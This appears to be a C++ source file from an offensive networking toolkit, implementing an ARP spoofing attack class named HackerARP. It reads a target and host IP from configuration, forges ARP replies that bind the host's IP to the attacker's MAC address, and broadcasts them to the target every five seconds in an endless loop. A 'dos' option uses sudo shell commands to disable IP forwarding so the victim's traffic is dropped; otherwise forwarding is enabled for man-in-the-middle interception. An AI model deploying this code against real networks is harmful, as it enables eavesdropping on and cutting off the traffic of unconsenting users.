#include "IHackerAttack.h"
#include "HackerARP.h"
#include "JsonConfHandler.h"
#include "HackerUtils.h"

#include <iostream>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
 #include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#include "DecoderLayer.h"
namespace RAChacker
{
    HackerARP::HackerARP() : uPacketSize(0)
    {
	bzero(cPacket, sizeof(cPacket));
	targetIP = RACconf::JsonConfHandler::GetValueFromConfigFile<std::string>("arp_spoof.target");
	hostIP = RACconf::JsonConfHandler::GetValueFromConfigFile<std::string>("arp_spoof.host");
	bBothSide = RACconf::JsonConfHandler::GetValueFromConfigFile<bool>("arp_spoof.both");
	bDos = RACconf::JsonConfHandler::GetValueFromConfigFile<bool>("arp_spoof.dos");

	makingAttack();
    }

    void	HackerARP::launchAttack(int socket)
    {
	LOG(INFO, "ARP LAUNCH ATTACK");
	unsigned long                                           ulRefferedTime;
	unsigned long                                           ulActualTime;
	struct timeval                                          tv;

	gettimeofday(&tv,NULL);
	ulRefferedTime = 1000000 * tv.tv_sec + tv.tv_usec;
	ulActualTime = ulRefferedTime;

	struct sockaddr_ll  sll;
	struct ifreq	    ifr;

	strncpy((char *)ifr.ifr_name, interface.c_str(), interface.length());
	ioctl(socket , SIOCGIFINDEX , &ifr);
	bzero(&sll , sizeof(sll));

	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ARP);
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_hatype = htons(ARPHRD_ETHER);
	sll.sll_pkttype = (PACKET_BROADCAST);
	sll.sll_halen =  6;
	sll.sll_addr[6] = 0x00;
	sll.sll_addr[7] = 0x00;
	memcpy(sll.sll_addr, uMacDest, sizeof(uMacDest));

	while (1)
	{
	    if ((ulActualTime - ulRefferedTime) >= 5000000)
	    {
		ulRefferedTime = ulActualTime;
		sendto(socket, cPacket, uPacketSize, 0, (struct sockaddr*)&sll, sizeof(struct sockaddr_ll));
//		send(socket, cPacket, uPacketSize, 0);
		LOG(INFO, "ARP ATTACK SENT");
		RACdecoder::DecoderLayer decoderLayer(cPacket);
		std::cout << decoderLayer.getProtocolDecoded() << std::endl;
	    }
	    gettimeofday(&tv,NULL);
	    ulActualTime = 1000000 * tv.tv_sec + tv.tv_usec;

	}
    }

    void    HackerARP::makingAttack()
    {
	// ETHERNET
	
	const uint8_t	aEtherType[2] = {0x08, 0x06}; // ARP
	ethernetLayer.setEtherType(aEtherType);

	// ARP

	ARPlayer.setHdwType(hardwareType::ETHERNET << 8);	
	ARPlayer.setProtocolType(htons(0x0800)); // ip
	ARPlayer.setHdwAddrLength(6); // ethernet
	ARPlayer.setProtocolAddrLength(4); // ipv4
	ARPlayer.setOpe(htons(ARPOP_REPLY)); // response
	ARPlayer.setSndrHdwAddr(uMacSrc);
	ARPlayer.setSndrInternetAddr(ntohl((inet_network(hostIP.c_str()))));
	if (targetIP != IPDest)
	{
	    bzero(uMacDest, sizeof(uMacDest));
	    HackerUtils::computeMacFromLocalIP(targetIP, uMacDest);
	}
	ARPlayer.setTgtHdwAddr(uMacDest);
	ARPlayer.setTgtInternetAddr(ntohl((inet_network(targetIP.c_str()))));

	if (bDos)
	{
	    system("echo ip_forward desactivate");
	    system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward");
	}
	else
	{
	    system("echo ip_forward activate");
	    system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward");
	}

	memcpy(cPacket, ethernetLayer.getProtocol(), ethernetLayer.getStructSize());
	memcpy(cPacket + ethernetLayer.getStructSize(), ARPlayer.getProtocol(), ARPlayer.getStructSize());
	uPacketSize = ethernetLayer.getStructSize() + ARPlayer.getStructSize();

	 RACdecoder::DecoderLayer decoderLayer(cPacket);
	 std::cout << decoderLayer.getProtocolDecoded() << std::endl;
    }
}
